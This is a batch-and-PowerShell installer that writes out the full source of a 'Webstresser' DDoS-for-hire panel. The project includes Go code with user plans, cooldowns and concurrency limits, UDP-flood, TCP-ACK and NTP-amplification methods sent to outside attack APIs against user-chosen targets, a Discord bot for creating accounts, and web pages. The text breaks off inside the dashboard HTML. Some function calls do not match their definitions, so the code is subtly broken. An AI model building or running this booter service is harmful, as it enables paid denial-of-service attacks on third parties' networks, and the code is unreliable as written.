@echo off
set "PS_FILE=%TEMP%\setup_%RANDOM%.ps1"
copy /y "%~f0" "%PS_FILE%" >nul
powershell -NoProfile -ExecutionPolicy Bypass -Command "& { $content = Get-Content '%PS_FILE%'; $start = $content.IndexOf('@@POWERSHELL_START@@'); $ps_code = $content[($start+1)..($content.Length-1)]; $ps_code -join [Environment]::NewLine | Invoke-Expression }"
del "%PS_FILE%"
pause
goto :eof

@@POWERSHELL_START@@
$ErrorActionPreference = "Stop"
Write-Host "Starting Webstresser Project Setup..." -ForegroundColor Cyan

# Create Directories
$dirs = @(
    "db",
    "internal\api",
    "internal\attack",
    "internal\auth",
    "internal\database",
    "internal\models",
    "discord_bot",
    "www\css",
    "www\js"
)

foreach ($dir in $dirs) {
    if (!(Test-Path $dir)) {
        New-Item -ItemType Directory -Path $dir | Out-Null
        Write-Host "Created directory: $dir" -ForegroundColor Gray
    }
}

# Define Files
$files = @{}

$files["config.json"] = @'
{
    "server_port": "8080",
    "db_user": "stresser_user",
    "db_password": "your_strong_password",
    "db_host": "127.0.0.1",
    "db_port": "3306",
    "db_name": "stresser",
    "jwt_secret": "a-very-secret-and-long-key-for-jwt",
    "discord_bot_token": "YOUR_DISCORD_BOT_TOKEN_HERE"
}
'@

$files["apis.json"] = @'
{
    "UDP-FLOOD": {
        "api_url": "http://yourapi.com/attack?key=APIKEY&target={target}&port={port}&duration={duration}&method=UDP",
        "plan": "free"
    },
    "TCP-ACK": {
        "api_url": "http://yourapi.com/attack?key=APIKEY&target={target}&port={port}&duration={duration}&method=ACK",
        "plan": "all"
    },
    "NTP-AMP": {
        "api_url": "http://anotherapi.net/start?target={target}&port={port}&time={duration}",
        "plan": "vip"
    }
}
'@

$files["db/schema.sql"] = @'
CREATE DATABASE IF NOT EXISTS stresser;
USE stresser;

CREATE TABLE IF NOT EXISTS plans (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(50) NOT NULL UNIQUE,
    max_time INT NOT NULL,
    max_concurrents INT NOT NULL,
    cooldown INT NOT NULL,
    is_vip BOOLEAN NOT NULL DEFAULT FALSE
);

CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    email VARCHAR(255) NOT NULL UNIQUE,
    password_hash VARCHAR(255) NOT NULL,
    plan_id INT NOT NULL,
    max_time INT NOT NULL,
    max_concurrents INT NOT NULL,
    cooldown INT NOT NULL,
    is_vip BOOLEAN NOT NULL DEFAULT FALSE,
    last_attack_time TIMESTAMP NULL,
    active_attacks INT NOT NULL DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (plan_id) REFERENCES plans(id)
);

CREATE TABLE IF NOT EXISTS attacks (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    target VARCHAR(255) NOT NULL,
    port INT NOT NULL,
    duration INT NOT NULL,
    method VARCHAR(50) NOT NULL,
    start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    end_time TIMESTAMP NULL,
    FOREIGN KEY (user_id) REFERENCES users(id)
);

-- Insert default plans (you can add more)
INSERT INTO plans (name, max_time, max_concurrents, cooldown, is_vip) VALUES 
('Free', 30, 1, 60, FALSE),
('VIP', 300, 4, 15, TRUE)
ON DUPLICATE KEY UPDATE name=name;
'@

$files["internal/models/models.go"] = @'
package models

import "time"

type Config struct {
	ServerPort      string `json:"server_port"`
	DBUser          string `json:"db_user"`
	DBPassword      string `json:"db_password"`
	DBHost          string `json:"db_host"`
	DBPort          string `json:"db_port"`
	DBName          string `json:"db_name"`
	JWTSecret       string `json:"jwt_secret"`
	DiscordBotToken string `json:"discord_bot_token"`
}

type APIInfo struct {
	URL  string `json:"api_url"`
	Plan string `json:"plan"` // "free", "vip", "all"
}

type User struct {
	ID                  int        `db:"id" json:"id"`
	Email               string     `db:"email" json:"email"`
	PasswordHash        string     `db:"password_hash" json:"-"`
	PlanID              int        `db:"plan_id" json:"plan_id"`
	LastAttackTime      *time.Time `db:"last_attack_time" json:"last_attack_time"`
	ActiveAttacks       int        `db:"active_attacks" json:"active_attacks"`
	CreatedAt           time.Time  `db:"created_at" json:"created_at"`
	PlanName            string     `db:"plan_name" json:"plan_name"`
	MaxTime             int        `db:"max_time" json:"max_time"`
	MaxConcurrents      int        `db:"max_concurrents" json:"max_concurrents"`
	Cooldown            int        `db:"cooldown" json:"cooldown"`
	IsVIP               bool       `db:"is_vip" json:"is_vip"`
	ForcePasswordChange bool       `db:"force_password_change" json:"force_password_change"`
}

type Plan struct {
	ID             int    `db:"id"`
	Name           string `db:"name"`
	MaxTime        int    `db:"max_time"`
	MaxConcurrents int    `db:"max_concurrents"`
	Cooldown       int    `db:"cooldown"`
	IsVIP          bool   `db:"is_vip"`
}

type Attack struct {
	ID        int       `db:"id" json:"id"`
	UserID    int       `db:"user_id" json:"user_id"`
	Target    string    `db:"target" json:"target"`
	Port      int       `db:"port" json:"port"`
	Duration  int       `db:"duration" json:"duration"`
	Method    string    `db:"method" json:"method"`
	StartTime time.Time `db:"start_time" json:"start_time"`
	EndTime   time.Time `db:"end_time" json:"end_time"`
}
'@

$files["internal/database/database.go"] = @'
package database

import (
	"database/sql"
	"fmt"
	"log"
	"time"
	"webstresser/internal/models"

	_ "github.com/go-sql-driver/mysql"
	"github.com/jmoiron/sqlx"
)

type DB struct {
	*sqlx.DB
}

func New(config *models.Config) (*DB, error) {
	dsn := fmt.Sprintf("%s:%s@tcp(%s:%s)/%s?parseTime=true",
		config.DBUser, config.DBPassword, config.DBHost, config.DBPort, config.DBName)

	db, err := sqlx.Connect("mysql", dsn)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to database: %w", err)
	}

	if err := db.Ping(); err != nil {
		return nil, fmt.Errorf("failed to ping database: %w", err)
	}

	log.Println("Successfully connected to the database.")

	if err := initSchema(db); err != nil {
		return nil, fmt.Errorf("failed to initialize database schema: %w", err)
	}

	return &DB{db}, nil
}

func (db *DB) GetUserByEmail(email string) (*models.User, error) {
	user := &models.User{}
	query := `
        SELECT u.*, p.name as plan_name
        FROM users u
        JOIN plans p ON u.plan_id = p.id
        WHERE u.email = ?`
	err := db.Get(user, query, email)
	if err != nil {
		return nil, err
	}
	return user, nil
}

func (db *DB) GetUserByID(id int) (*models.User, error) {
	user := &models.User{}
	query := `
        SELECT u.*, p.name as plan_name
        FROM users u
        JOIN plans p ON u.plan_id = p.id
        WHERE u.id = ?`
	err := db.Get(user, query, id)
	if err != nil {
		return nil, err
	}
	return user, nil
}

func (db *DB) CreateUser(email, passwordHash, planName string, maxTime, maxConcurrents int, forceChange bool) error {
	var plan models.Plan
	err := db.Get(&plan, "SELECT * FROM plans WHERE name = ?", planName)
	if err != nil {
		if err == sql.ErrNoRows {
			return fmt.Errorf("plan '%s' not found", planName)
		}
		return err
	}

	query := "INSERT INTO users (email, password_hash, plan_id, max_time, max_concurrents, cooldown, is_vip, force_password_change) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
	_, err = db.Exec(query, email, passwordHash, plan.ID, maxTime, maxConcurrents, plan.Cooldown, plan.IsVIP, forceChange)
	return err
}

func (db *DB) UpdateUserLimit(email string, limitType string, value int) error {
	var column string
	switch limitType {
	case "max_time":
		column = "max_time"
	case "concurrents":
		column = "max_concurrents"
	default:
		return fmt.Errorf("invalid limit type: use 'max_time' or 'concurrents'")
	}
	query := fmt.Sprintf("UPDATE users SET %s = ? WHERE email = ?", column)
	_, err := db.Exec(query, value, email)
	return err
}

func (db *DB) UpdateLastAttackTime(userID int, lastAttackTime *time.Time) error {
	query := "UPDATE users SET last_attack_time = ? WHERE id = ?"
	_, err := db.Exec(query, lastAttackTime, userID)
	return err
}

func (db *DB) RecordAttack(userID int, target string, port, duration int, method string) error {
	query := `INSERT INTO attacks (user_id, target, port, duration, method, end_time) 
              VALUES (?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL ? SECOND))`
	_, err := db.Exec(query, userID, target, port, duration, method, duration)
	return err
}

func (db *DB) GetRunningAttacks(userID int) ([]models.Attack, error) {
	var attacks []models.Attack
	err := db.Select(&attacks, "SELECT * FROM attacks WHERE user_id = ? AND end_time > NOW() ORDER BY end_time ASC", userID)
	return attacks, err
}

func (db *DB) GetActiveAttackCount(userID int) (int, error) {
	var count int
	err := db.Get(&count, "SELECT COUNT(*) FROM attacks WHERE user_id = ? AND end_time > NOW()", userID)
	return count, err
}

func (db *DB) UpdatePassword(userID int, newHash string) error {
	_, err := db.Exec("UPDATE users SET password_hash = ?, force_password_change = 0 WHERE id = ?", newHash, userID)
	return err
}

func initSchema(db *sqlx.DB) error {
	queries := []string{
		`CREATE TABLE IF NOT EXISTS plans (
			id INT AUTO_INCREMENT PRIMARY KEY,
			name VARCHAR(50) NOT NULL UNIQUE,
			max_time INT NOT NULL,
			max_concurrents INT NOT NULL,
			cooldown INT NOT NULL,
			is_vip BOOLEAN NOT NULL DEFAULT FALSE
		);`,
		`CREATE TABLE IF NOT EXISTS users (
			id INT AUTO_INCREMENT PRIMARY KEY,
			email VARCHAR(255) NOT NULL UNIQUE,
			password_hash VARCHAR(255) NOT NULL,
			plan_id INT NOT NULL,
			max_time INT NOT NULL,
			max_concurrents INT NOT NULL,
			cooldown INT NOT NULL,
			is_vip BOOLEAN NOT NULL DEFAULT FALSE,
			force_password_change BOOLEAN NOT NULL DEFAULT FALSE,
			last_attack_time TIMESTAMP NULL,
			active_attacks INT NOT NULL DEFAULT 0,
			created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			FOREIGN KEY (plan_id) REFERENCES plans(id)
		);`,
		`CREATE TABLE IF NOT EXISTS attacks (
			id INT AUTO_INCREMENT PRIMARY KEY,
			user_id INT NOT NULL,
			target VARCHAR(255) NOT NULL,
			port INT NOT NULL,
			duration INT NOT NULL,
			method VARCHAR(50) NOT NULL,
			start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			end_time TIMESTAMP NULL,
			FOREIGN KEY (user_id) REFERENCES users(id)
		);`,
		`INSERT INTO plans (name, max_time, max_concurrents, cooldown, is_vip) VALUES 
		('Free', 30, 1, 60, FALSE),
		('VIP', 300, 4, 15, TRUE)
		ON DUPLICATE KEY UPDATE name=name;`,
	}

	for _, query := range queries {
		if _, err := db.Exec(query); err != nil {
			return fmt.Errorf("error executing schema query: %w", err)
		}
	}

	// Migrations for existing tables
	migrations := []struct {
		Column string
		Query  string
	}{
		{"max_time", "ALTER TABLE users ADD COLUMN max_time INT NOT NULL DEFAULT 30"},
		{"max_concurrents", "ALTER TABLE users ADD COLUMN max_concurrents INT NOT NULL DEFAULT 1"},
		{"cooldown", "ALTER TABLE users ADD COLUMN cooldown INT NOT NULL DEFAULT 60"},
		{"is_vip", "ALTER TABLE users ADD COLUMN is_vip BOOLEAN NOT NULL DEFAULT FALSE"},
		{"force_password_change", "ALTER TABLE users ADD COLUMN force_password_change BOOLEAN NOT NULL DEFAULT FALSE"},
	}

	for _, m := range migrations {
		checkQuery := fmt.Sprintf("SELECT %s FROM users LIMIT 1", m.Column)
		rows, err := db.Query(checkQuery)
		if err != nil {
			if _, err := db.Exec(m.Query); err != nil {
				log.Printf("Migration error: failed to add column %s: %v", m.Column, err)
			} else {
				log.Printf("Migration success: added column %s", m.Column)
			}
		} else {
			rows.Close()
		}
	}

	return nil
}
'@

$files["internal/auth/auth.go"] = @'
package auth

import (
	"time"
	"webstresser/internal/models"

	"github.com/golang-jwt/jwt/v4"
	"golang.org/x/crypto/bcrypt"
)

var jwtKey []byte

func SetJWTKey(key string) {
	jwtKey = []byte(key)
}

type Claims struct {
	UserID int `json:"user_id"`
	jwt.RegisteredClaims
}

func HashPassword(password string) (string, error) {
	bytes, err := bcrypt.GenerateFromPassword([]byte(password), 14)
	return string(bytes), err
}

func CheckPasswordHash(password, hash string) bool {
	err := bcrypt.CompareHashAndPassword([]byte(hash), []byte(password))
	return err == nil
}

func GenerateJWT(user *models.User) (string, error) {
	expirationTime := time.Now().Add(24 * time.Hour)
	claims := &Claims{
		UserID: user.ID,
		RegisteredClaims: jwt.RegisteredClaims{
			ExpiresAt: jwt.NewNumericDate(expirationTime),
		},
	}

	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	return token.SignedString(jwtKey)
}
'@

$files["internal/auth/middleware.go"] = @'
package auth

import (
	"context"
	"net/http"
	"strings"

	"github.com/golang-jwt/jwt/v4"
)

type contextKey string

const UserIDKey contextKey = "userID"

func Middleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		authHeader := r.Header.Get("Authorization")
		if authHeader == "" {
			http.Error(w, "Missing authorization header", http.StatusUnauthorized)
			return
		}

		tokenStr := strings.TrimPrefix(authHeader, "Bearer ")
		if tokenStr == authHeader {
			http.Error(w, "Invalid authorization header format", http.StatusUnauthorized)
			return
		}

		claims := &Claims{}
		token, err := jwt.ParseWithClaims(tokenStr, claims, func(token *jwt.Token) (interface{}, error) {
			return jwtKey, nil
		})

		if err != nil || !token.Valid {
			http.Error(w, "Invalid token", http.StatusUnauthorized)
			return
		}

		ctx := context.WithValue(r.Context(), UserIDKey, claims.UserID)
		next.ServeHTTP(w, r.WithContext(ctx))
	})
}
'@

$files["internal/attack/manager.go"] = @'
package attack

import (
	"log"
	"net/http"
	"strings"
	"webstresser/internal/database"
)

type Manager struct {
	DB *database.DB
}

func NewManager(db *database.DB) *Manager {
	return &Manager{DB: db}
}

func (m *Manager) Launch(apiURL, target, port, duration string, userID int) {
	go func() {
		finalURL := strings.Replace(apiURL, "{target}", target, -1)
		finalURL = strings.Replace(finalURL, "{port}", port, -1)
		finalURL = strings.Replace(finalURL, "{duration}", duration, -1)

		log.Printf("User %d launching attack to %s", userID, finalURL)

		resp, err := http.Get(finalURL)
		if err != nil {
			log.Printf("Error launching attack for user %d: %v", userID, err)
			return
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			log.Printf("Attack API returned non-200 status for user %d: %s", userID, resp.Status)
		} else {
			log.Printf("Attack successfully sent for user %d", userID)
		}
	}()
}
'@

$files["internal/api/handlers.go"] = @'
package api

import (
	"encoding/json"
	"log"
	"net/http"
	"strconv"
	"time"
	"webstresser/internal/attack"
	"webstresser/internal/auth"
	"webstresser/internal/database"
	"webstresser/internal/models"
)

type APIHandler struct {
	DB            *database.DB
	AttackManager *attack.Manager
	APIs          map[string]models.APIInfo
}

func (h *APIHandler) respondJSON(w http.ResponseWriter, status int, payload interface{}) {
	response, err := json.Marshal(payload)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte(err.Error()))
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	w.Write(response)
}

func (h *APIHandler) respondError(w http.ResponseWriter, code int, message string) {
	h.respondJSON(w, code, map[string]string{"error": message})
}

func (h *APIHandler) Register(w http.ResponseWriter, r *http.Request) {
	var creds struct {
		Email    string `json:"email"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&creds); err != nil {
		h.respondError(w, http.StatusBadRequest, "Invalid request payload")
		return
	}

	hashedPassword, err := auth.HashPassword(creds.Password)
	if err != nil {
		h.respondError(w, http.StatusInternalServerError, "Could not process password")
		return
	}

	if err := h.DB.CreateUser(creds.Email, hashedPassword, "Free"); err != nil {
		h.respondError(w, http.StatusInternalServerError, "Could not create user")
		return
	}

	h.respondJSON(w, http.StatusCreated, map[string]string{"message": "User created successfully"})
}

func (h *APIHandler) Login(w http.ResponseWriter, r *http.Request) {
	var creds struct {
		Email    string `json:"email"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&creds); err != nil {
		h.respondError(w, http.StatusBadRequest, "Invalid request payload")
		return
	}

	user, err := h.DB.GetUserByEmail(creds.Email)
	if err != nil {
		h.respondError(w, http.StatusUnauthorized, "Invalid credentials")
		return
	}

	if !auth.CheckPasswordHash(creds.Password, user.PasswordHash) {
		h.respondError(w, http.StatusUnauthorized, "Invalid credentials")
		return
	}

	tokenString, err := auth.GenerateJWT(user)
	if err != nil {
		h.respondError(w, http.StatusInternalServerError, "Could not generate token")
		return
	}

	h.respondJSON(w, http.StatusOK, map[string]interface{}{
		"token":                 tokenString,
		"force_password_change": user.ForcePasswordChange,
	})
}

func (h *APIHandler) ChangePassword(w http.ResponseWriter, r *http.Request) {
	var req struct {
		NewPassword string `json:"new_password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		h.respondError(w, http.StatusBadRequest, "Invalid request")
		return
	}

	userID := r.Context().Value(auth.UserIDKey).(int)
	hashedPassword, _ := auth.HashPassword(req.NewPassword)

	if err := h.DB.UpdatePassword(userID, hashedPassword); err != nil {
		log.Printf("Error updating password for user %d: %v", userID, err)
		h.respondError(w, http.StatusInternalServerError, "Failed to update password")
		return
	}
	h.respondJSON(w, http.StatusOK, map[string]string{"message": "Password updated"})
}

func (h *APIHandler) GetDashboardInfo(w http.ResponseWriter, r *http.Request) {
	userID := r.Context().Value(auth.UserIDKey).(int)
	user, err := h.DB.GetUserByID(userID)
	if err != nil {
		h.respondError(w, http.StatusNotFound, "User not found")
		return
	}

	activeAttacks, err := h.DB.GetRunningAttacks(userID)
	if err != nil {
		// Log error but don't fail, just return empty list
		log.Printf("Error fetching running attacks: %v", err)
		activeAttacks = []models.Attack{}
	}

	user.PasswordHash = ""
	h.respondJSON(w, http.StatusOK, map[string]interface{}{
		"user":    user,
		"attacks": activeAttacks,
	})
}

func (h *APIHandler) GetMethods(w http.ResponseWriter, r *http.Request) {
	userID := r.Context().Value(auth.UserIDKey).(int)
	user, err := h.DB.GetUserByID(userID)
	if err != nil {
		h.respondError(w, http.StatusNotFound, "User not found")
		return
	}

	availableMethods := make(map[string]models.APIInfo)
	for name, info := range h.APIs {
		if info.Plan == "all" || (info.Plan == "vip" && user.IsVIP) || (info.Plan == "free" && !user.IsVIP) {
			availableMethods[name] = info
		}
	}
	h.respondJSON(w, http.StatusOK, availableMethods)
}

func (h *APIHandler) LaunchAttack(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Target   string `json:"target"`
		Port     int    `json:"port"`
		Duration int    `json:"duration"`
		Method   string `json:"method"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		h.respondError(w, http.StatusBadRequest, "Invalid request payload")
		return
	}

	userID := r.Context().Value(auth.UserIDKey).(int)
	user, err := h.DB.GetUserByID(userID)
	if err != nil {
		h.respondError(w, http.StatusNotFound, "User not found")
		return
	}

	currentAttacks, err := h.DB.GetActiveAttackCount(user.ID)
	if err != nil {
		h.respondError(w, http.StatusInternalServerError, "Failed to check concurrency")
		return
	}

	if currentAttacks >= user.MaxConcurrents {
		h.respondError(w, http.StatusConflict, "Concurrent attack limit reached")
		return
	}

	if user.LastAttackTime != nil {
		cooldownEnd := user.LastAttackTime.Add(time.Duration(user.Cooldown) * time.Second)
		if time.Now().Before(cooldownEnd) {
			remaining := time.Until(cooldownEnd).Seconds()
			h.respondError(w, http.StatusTooManyRequests, "Cooldown active. Please wait "+strconv.Itoa(int(remaining))+" seconds.")
			return
		}
	}

	if req.Duration <= 0 || req.Duration > user.MaxTime {
		h.respondError(w, http.StatusBadRequest, "Invalid attack duration. Max: "+strconv.Itoa(user.MaxTime)+"s")
		return
	}

	api, ok := h.APIs[req.Method]
	if !ok {
		h.respondError(w, http.StatusBadRequest, "Invalid method")
		return
	}

	if api.Plan == "vip" && !user.IsVIP {
		h.respondError(w, http.StatusForbidden, "This method requires a VIP plan")
		return
	}

	now := time.Now()
	if err := h.DB.UpdateLastAttackTime(user.ID, &now); err != nil {
		log.Printf("Failed to update user attack time: %v", err)
		h.respondError(w, http.StatusInternalServerError, "Failed to initiate attack")
		return
	}

	if err := h.DB.RecordAttack(user.ID, req.Target, req.Port, req.Duration, req.Method); err != nil {
		log.Printf("Failed to record attack: %v", err)
		h.respondError(w, http.StatusInternalServerError, "Failed to initiate attack")
		return
	}

	h.AttackManager.Launch(api.URL, req.Target, strconv.Itoa(req.Port), strconv.Itoa(req.Duration), user.ID)

	h.respondJSON(w, http.StatusOK, map[string]string{"message": "Attack launched successfully"})
}
'@

$files["internal/api/router.go"] = @'
package api

import (
	"net/http"
	"webstresser/internal/auth"

	"github.com/gorilla/mux"
)

func NewRouter(apiHandler *APIHandler) *mux.Router {
	r := mux.NewRouter()

	api := r.PathPrefix("/api").Subrouter()
	api.HandleFunc("/register", apiHandler.Register).Methods("POST")
	api.HandleFunc("/login", apiHandler.Login).Methods("POST")

	authAPI := api.PathPrefix("/").Subrouter()
	authAPI.Use(auth.Middleware)
	authAPI.HandleFunc("/dashboard/info", apiHandler.GetDashboardInfo).Methods("GET")
	authAPI.HandleFunc("/methods", apiHandler.GetMethods).Methods("GET")
	authAPI.HandleFunc("/attack", apiHandler.LaunchAttack).Methods("POST")
	authAPI.HandleFunc("/change-password", apiHandler.ChangePassword).Methods("POST")

	r.PathPrefix("/").Handler(http.FileServer(http.Dir("./www/")))

	return r
}
'@

$files["discord_bot/bot.go"] = @'
package discord_bot

import (
	"fmt"
	"log"
	"strings"
	"webstresser/internal/auth"
	"webstresser/internal/database"

	"github.com/bwmarrin/discordgo"
)

type Bot struct {
	Session *discordgo.Session
	DB      *database.DB
}

func NewBot(token string, db *database.DB) (*Bot, error) {
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		return nil, fmt.Errorf("error creating Discord session: %w", err)
	}

	bot := &Bot{
		Session: dg,
		DB:      db,
	}

	dg.AddHandler(bot.messageCreate)
	dg.Identify.Intents = discordgo.IntentsGuildMessages

	return bot, nil
}

func (b *Bot) Start() error {
	log.Println("Discord bot is starting...")
	err := b.Session.Open()
	if err != nil {
		return fmt.Errorf("error opening connection: %w", err)
	}
	log.Println("Discord bot is now running. Press CTRL-C to exit.")
	return nil
}

func (b *Bot) Stop() {
	b.Session.Close()
}

func (b *Bot) messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	if strings.HasPrefix(m.Content, "!createuser") {
		log.Printf("Received !createuser command from %s", m.Author.Username)

		parts := strings.Fields(m.Content)
		if len(parts) != 4 {
			s.ChannelMessageSend(m.ChannelID, "Usage: `!createuser <email> <password> <plan_name>` (e.g., Free, VIP)")
			return
		}

		email := parts[1]
		password := parts[2]
		planName := parts[3]

		hashedPassword, err := auth.HashPassword(password)
		if err != nil {
			log.Printf("Error hashing password for discord user creation: %v", err)
			s.ChannelMessageSend(m.ChannelID, "Error creating user: could not process password.")
			return
		}

		err = b.DB.CreateUser(email, hashedPassword, planName)
		if err != nil {
			log.Printf("Error creating user from discord: %v", err)
			s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Error creating user: %s", err.Error()))
			return
		}

		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("[OK] User `%s` created successfully with plan `%s`.", email, planName))
	}
}
'@

$files["main.go"] = @'
package main

import (
	"bytes"
	"encoding/json"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"syscall"
	"webstresser/discord_bot"
	"webstresser/internal/api"
	"webstresser/internal/attack"
	"webstresser/internal/auth"
	"webstresser/internal/database"
	"webstresser/internal/models"
)

func loadConfig(path string) (*models.Config, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	data, err := io.ReadAll(file)
	if err != nil {
		return nil, err
	}
	data = bytes.TrimPrefix(data, []byte("\xef\xbb\xbf"))

	var config models.Config
	if err := json.Unmarshal(data, &config); err != nil {
		return nil, err
	}
	return &config, nil
}

func loadAPIs(path string) (map[string]models.APIInfo, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	data, err := io.ReadAll(file)
	if err != nil {
		return nil, err
	}
	data = bytes.TrimPrefix(data, []byte("\xef\xbb\xbf"))

	var apis map[string]models.APIInfo
	if err := json.Unmarshal(data, &apis); err != nil {
		return nil, err
	}
	return apis, nil
}

func main() {
	config, err := loadConfig("config.json")
	if err != nil {
		log.Fatalf("Failed to load config.json: %v", err)
	}

	apis, err := loadAPIs("apis.json")
	if err != nil {
		log.Fatalf("Failed to load apis.json: %v", err)
	}

	auth.SetJWTKey(config.JWTSecret)

	db, err := database.New(config)
	if err != nil {
		log.Fatalf("Database initialization failed: %v", err)
	}

	attackManager := attack.NewManager(db)
	apiHandler := &api.APIHandler{
		DB:            db,
		AttackManager: attackManager,
		APIs:          apis,
	}

	router := api.NewRouter(apiHandler)

	if config.DiscordBotToken != "" && config.DiscordBotToken != "YOUR_DISCORD_BOT_TOKEN_HERE" {
		bot, err := discord_bot.NewBot(config.DiscordBotToken, db)
		if err != nil {
			log.Printf("Failed to create Discord bot: %v", err)
		} else {
			go func() {
				if err := bot.Start(); err != nil {
					log.Printf("Discord bot error: %v", err)
				}
			}()
			defer bot.Stop()
		}
	} else {
		log.Println("Discord bot token not provided, skipping bot startup.")
	}

	serverAddr := ":" + config.ServerPort
	log.Printf("Starting server on %s", serverAddr)
	go func() {
		if err := http.ListenAndServe(serverAddr, router); err != nil {
			log.Fatalf("Server failed to start: %v", err)
		}
	}()

	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc

	log.Println("Shutting down server and bot...")
}
'@

$files["www/index.html"] = @'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <link rel="stylesheet" href="/css/style.css">
</head>
<body>
    <div class="container" style="text-align: center;">
        <h1>Stresser Panel</h1>
        <p>High-performance testing solutions.</p>
        <a href="/login.html" class="btn">Login or Register</a>
    </div>
    <script>
        if (localStorage.getItem('jwt_token')) {
            window.location.href = '/dashboard.html';
        }
    </script>
</body>
</html>
'@

$files["www/css/style.css"] = @'
:root {
    --bg-color: #121212;
    --primary-color: #e50914;
    --secondary-color: #222;
    --text-color: #f5f5f1;
    --border-color: #333;
    --gradient-start: #3a0000;
    --gradient-end: #000000;
}

body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    background-color: var(--bg-color);
    color: var(--text-color);
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    background-image: linear-gradient(to top right, var(--gradient-end), var(--gradient-start));
}

.container {
    width: 90%;
    max-width: 500px;
    background-color: var(--secondary-color);
    padding: 2rem;
    border-radius: 8px;
    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
    border: 1px solid var(--border-color);
}

h1, h2 {
    color: var(--primary-color);
    text-align: center;
    text-transform: uppercase;
    letter-spacing: 2px;
    margin-bottom: 1.5rem;
}

.form-group {
    margin-bottom: 1.5rem;
}

label {
    display: block;
    margin-bottom: 0.5rem;
    font-size: 0.9rem;
    color: #aaa;
}

input[type="email"],
input[type="password"],
input[type="text"],
input[type="number"],
select {
    width: 100%;
    padding: 12px;
    background-color: var(--bg-color);
    border: 1px solid var(--border-color);
    border-radius: 4px;
    color: var(--text-color);
    font-size: 1rem;
    box-sizing: border-box;
}

input:focus, select:focus {
    outline: none;
    border-color: var(--primary-color);
    box-shadow: 0 0 5px var(--primary-color);
}

.btn {
    width: 100%;
    padding: 15px;
    background-color: var(--primary-color);
    color: white;
    border: none;
    border-radius: 4px;
    font-size: 1.1rem;
    font-weight: bold;
    cursor: pointer;
    transition: background-color 0.3s ease;
    text-transform: uppercase;
}

.btn:hover {
    background-color: #b20710;
}

.btn:disabled {
    background-color: #555;
    cursor: not-allowed;
}

#error-message {
    color: #ff4d4d;
    background-color: rgba(255, 77, 77, 0.1);
    padding: 10px;
    border-radius: 4px;
    text-align: center;
    margin-top: 1rem;
    display: none;
}

.dashboard-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 1rem;
    margin-bottom: 2rem;
}

.info-box {
    background-color: var(--bg-color);
    padding: 1rem;
    border-radius: 5px;
    text-align: center;
    border: 1px solid var(--border-color);
}

.info-box h3 {
    margin-top: 0;
    color: #aaa;
    font-size: 0.9rem;
    text-transform: uppercase;
}

.info-box p {
    margin-bottom: 0;
    font-size: 1.5rem;
    font-weight: bold;
    color: var(--primary-color);
}

.vip-badge {
    color: #ffd700;
}

#logout-btn {
    margin-top: 1.5rem;
    background: none;
    border: 1px solid var(--primary-color);
    color: var(--primary-color);
}

#logout-btn:hover {
    background: var(--primary-color);
    color: white;
}
'@

$files["www/login.html"] = @'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="/css/style.css">
</head>
<body>
    <div class="container">
        <h1>Login</h1>
        <form id="login-form">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" required>
            </div>
            <button type="submit" class="btn">Login</button>
        </form>
        <div id="error-message"></div>
    </div>

    <script src="/js/main.js"></script>
</body>
</html>
'@

$files["www/dashboard.html"] = @'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <link rel="stylesheet" href="/css/style.css">
</head>
<body>
    <div class="container">
        <h2>Welcome, <span id="user-email">...</span></h2>
        
        <div class="dashboard-grid">
            <div class="info-box">
                <h3>Plan</h3>
                <p id="plan-name">...</p>
            </div>
            <div class="info-box">
                <h3>Concurrents</h3>
